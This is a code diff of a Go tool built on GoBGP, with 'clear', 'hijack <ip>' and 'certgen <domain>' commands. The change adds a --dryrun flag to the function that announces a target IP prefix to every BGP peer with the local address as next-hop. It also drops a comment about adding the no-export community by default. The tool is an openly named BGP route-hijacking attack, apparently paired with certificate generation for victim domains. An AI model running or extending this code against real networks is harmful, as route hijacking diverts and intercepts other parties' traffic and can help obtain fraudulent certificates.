@@ -253,11 +253,11 @@ func determinePrefixLength(ip string) (uint32, error) {
 	return 0, fmt.Errorf("invalid IP address format: %s", ip)
 }
 
-func hijackRoutes(client api.GobgpApiClient, ctx context.Context, ip string, prefixLenOverride ...uint32) error {
+func hijackRoutes(client api.GobgpApiClient, ctx context.Context, ip string, dryrun bool, prefixLenOverride ...uint32) error {
 	// Using automatic prefix length determination
-	// hijackRoutes(client, ctx, "192.168.1.0")
+	// hijackRoutes(client, ctx, "192.168.1.0", false)
 	// Using a specific prefix length
-	// hijackRoutes(client, ctx, "192.168.1.0", 16)
+	// hijackRoutes(client, ctx, "192.168.1.0", false, 16)
 	
 	// Get BGP neighbors
 	stream, err := client.ListPeer(ctx, &api.ListPeerRequest{})
@@ -288,8 +288,13 @@ func hijackRoutes(client api.GobgpApiClient, ctx context.Context, ip string, pre
 			peer.Peer.Conf.PeerAsn,
 			peer.Peer.State.SessionState)
 
+		if dryrun {
+			fmt.Printf("[DRYRUN] Would add route %s/%d to %s\n", 
+				ip, prefixLen, peer.Peer.Conf.NeighborAddress)
+			continue
+		}
+
 		// Add a new route using our local address as next-hop
-		// Add no-export community by default
 		err = addRoute(client, ctx, ip, prefixLen, peer.Peer.Transport.LocalAddress)
 		if err != nil {
 			return fmt.Errorf("failed to add route to %s: %v", peer.Peer.Conf.NeighborAddress, err)
@@ -314,7 +319,7 @@ func main() {
 	}
 
 	if len(os.Args) < 2 {
-		log.Fatal("Usage: go run main.go <command>\nCommands:\n  clear   - Clear all routes\n  hijack <ip>  - Add hijack route for specified IP\n  certgen <domain> - Generate certificate for specified domain")
+		log.Fatal("Usage: go run main.go <command>\nCommands:\n  clear   - Clear all routes\n  hijack <ip> [--dryrun]  - Add hijack route for specified IP\n  certgen <domain> - Generate certificate for specified domain")
 	}
 
 	// Connect to GoBGP daemon
@@ -337,10 +342,11 @@ func main() {
 
 	case "hijack":
 		if len(os.Args) < 3 {
-			log.Fatal("Usage: go run main.go hijack <ip>")
+			log.Fatal("Usage: go run main.go hijack <ip> [--dryrun]")
 		}
 		targetIP := os.Args[2]
-		if err := hijackRoutes(client, ctx, targetIP); err != nil {
+		dryrun := len(os.Args) > 3 && os.Args[3] == "--dryrun"
+		if err := hijackRoutes(client, ctx, targetIP, dryrun); err != nil {
 			log.Fatalf("Failed to hijack routes: %v", err)
 		}
 
@@ -354,6 +360,6 @@ func main() {
 		}
 
 	default:
-		log.Fatal("Unknown command. Available commands: clear, hijack <ip>, certgen <domain>")
+		log.Fatal("Unknown command. Available commands: clear, hijack <ip> [--dryrun], certgen <domain>")
 	}
 } 
